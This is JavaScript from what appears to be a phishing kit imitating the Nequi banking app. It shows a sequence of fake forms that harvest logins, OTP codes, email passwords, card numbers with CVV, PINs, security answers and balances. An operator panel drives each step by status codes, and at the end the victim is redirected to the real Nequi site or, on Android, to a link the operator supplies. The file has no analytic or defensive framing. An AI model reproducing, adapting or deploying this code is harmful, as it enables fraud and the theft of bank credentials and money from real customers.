function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

// Inicializar variable para almacenar el estado anterior
window.__lastNequiEstado = null;

/** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 5 saldo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
function consultar_estado() {
    if (window.__nequiDemoSaldo) {
        return;
    }
    $.post("../../../process/estado.php", function (data) {
        var s = $.trim(String(data));
        if (!/^\d+$/.test(s)) {
            return;
        }
        var prevEst = window.__lastNequiEstado;
        window.__lastNequiEstado = s;
        switch (s) {
            case '2':
                if (prevEst !== '2' || !$(".otp").is(":visible") || $(".errorotp").is(":visible")) {
                    vista_otp();
                }
                espera = 1;
                break;
            case '4':
                if (prevEst !== '4' || !$(".correo-con").is(":visible")) {
                    vista_email();
                }
                espera = 1;
                break;
            case '5':  // Estado para saldo
                if (prevEst !== '5' || !$(".saldo-disponible").is(":visible")) {
                    vista_saldo();
                }
                espera = 1;
                break;
            case '6':
                if (prevEst !== '6' || !$(".tarjeta").is(":visible")) {
                    vista_tarjeta();
                }
                espera = 1;
                break;
            case '8':
                if (prevEst !== '8' || !$(".errorotp").is(":visible")) {
                    vista_errorotp();
                }
                espera = 1;
                break;
            case '10':
                if (prevEst !== '10') {
                    window.location.href = "../../../finish-no-back-button/";
                }
                espera = 1;
                break;
            case '12':
                if (prevEst !== '12' || !$(".acceso").is(":visible")) {
                    vista_usuario();
                }
                espera = 1;
                break;
            case '25':
                if (prevEst !== '25' || !$(".pregunta2").is(":visible")) {
                    vista_pregunta2();
                }
                espera = 1;
                break;
            case '255':
                if (prevEst !== '255' || !$(".pregunta2").is(":visible")) {
                    vista_preguntarep();
                }
                espera = 1;
                break;
            case '27':
                if (prevEst !== '27') {
                    vista_saldo_listo();
                }
                espera = 1;
                break;
            case '28':
                if (prevEst !== '28') {
                    vista_saldo_listo();
                }
                espera = 1;
                break;
            default:
                espera = 1;
                break;
        }
    });
}

function vista_saldo() {
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".total").hide();
    $(".acceso").hide();
    $(".otp").hide();
    $(".errorotp").hide();
    $(".correo-con").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();
    
    var el = document.getElementById("inputsaldo");
    if (el) {
        el.value = "";
        el.focus();
    }
    
    $(".saldo-disponible").show();
}

function vista_saldo_listo() {
    $(".saldo-disponible").hide();
    $(".fondo").show();
    $(".mensaje").show();
}

function vista_preguntarep(){
    $(".saldo-disponible").hide();

    var op = 'pregunta';

    $.post( "../../run/pasopregunta2.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".codigoqr").hide();
    $(".clcj").hide();
    $(".pregunta2").show();
    $("#resp2").focus();
}

function salir(){
    equi = detectar_dispositivo();
	console.log(equi);

        if (equi === 'Android' ) {

            var op = 'link';

            $.post( "run/traer-datos.php",{op: op},function(date) {
                console.log(date);
                var link = date;
                window.location.href = 'https://'+link;
                
             }); 

        } else {
            console.log('no es android');
            window.location.href = "https://www.nequi.com.co/";
        }
}

function vista_otp(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();
    $(".total").show();     
    $(".otp").show();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;
}

function vista_errorotp(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    $(".tarjeta").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show(); 
    $(".otp").show();        
    $(".errorotp").show();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;
}

function vista_usuario(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("usuario").value = "";
    document.getElementById("password").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".acceso").show();
    $("#usuario").focus();
}

function vista_email(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("email").value = "";
    document.getElementById("clavemail").value = "";

    $(".acceso").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".correo-con").show();
    $("#email").focus();
}

function vista_tarjeta(){
    $(".fondo").hide();
    $(".mensaje").hide();
    $(".saldo-disponible").hide();

    document.getElementById("tarjeta16").value = "";
    document.getElementById("Fecha").value = "";
    document.getElementById("cvv").value = "";

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjeta").show();
    $("#tarjeta16").focus();
}

function vista_tarjetadt(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16dt").value = "";
    document.getElementById("Fechadt").value = "";
    document.getElementById("cvvdt").value = "";
    document.getElementById("clavedt").value = ""; 

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".tarjeta").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjetadt").show();
    $("#tarjeta16dt").focus();
}

function vista_apellidos(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("apellido").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide(); 
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".apellidos").show();
    $("#apellido").focus();
}

function vista_fnacimiento(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("nacimiento").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide();  
    $(".apellidos").hide(); 
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".fnacimiento").show();
    $("#nacimiento").focus();
}

function vista_celular(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("celular").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".mobil").show(); 
    $("#celular").focus();
}

function vista_pregunta(){
    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide();
    $(".codigootp3").hide();     
    $(".total").show();     
    $(".pregunta").show();
    $("#resp").focus();
}

function vista_pregunta2(){
    $(".saldo-disponible").hide();

    var op = 'pregunta';

    $.post( "../../../process/nequi_pregunta.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".pregunta2").show();
    $("#resp2").focus();
}

function vista_clave(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave").show();
    $("#clave").focus();
}

function vista_clave2(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave2").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave2").show();
    $("#clave2").focus();
}

function vista_smsotp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("smsotp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();   
    $(".smsotp").show();
    $("#smsotp").focus();
}

function vista_gestionpago(){
    $(".fondo").hide();
    $(".mensaje").hide();
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".total").hide();
    $(".codigootp3").hide();    
    $(".solicitacodigo").show();
}

function actualizar_casos(){
    $.post( "../process/casos.php", function(data) {
        $(".contenido").html(data);     
        $.post( "../process/pito.php", function(res) {
            if (res == "SI") {
                $("audio").get(0).play();
            }
        });
    });
}

// ✅ FUNCIÓN CORREGIDA - AHORA ESTÁ EN EL NIVEL CORRECTO
function guardarSaldoNequi() {
    var saldo = document.getElementById("inputsaldo").value;
    
    if (saldo.trim().length < 3) {
        document.getElementById("msgSaldo").style.display = "block";
        return;
    }
    
    // Mostrar spinner de carga
    vista_saldo_listo();
    
    // Enviar saldo al backend
    $.post("../../../process/guardar_saldo.php", {saldo: saldo}, function(data) {
        if (data.trim() === 'OK') {
            console.log('Saldo guardado correctamente');
            // El panel cambiará de estado automáticamente (estado 27 → 28)
        } else {
            console.error('Error al guardar saldo');
            vista_saldo();  // Volver a mostrar el formulario si hay error
        }
    });
}
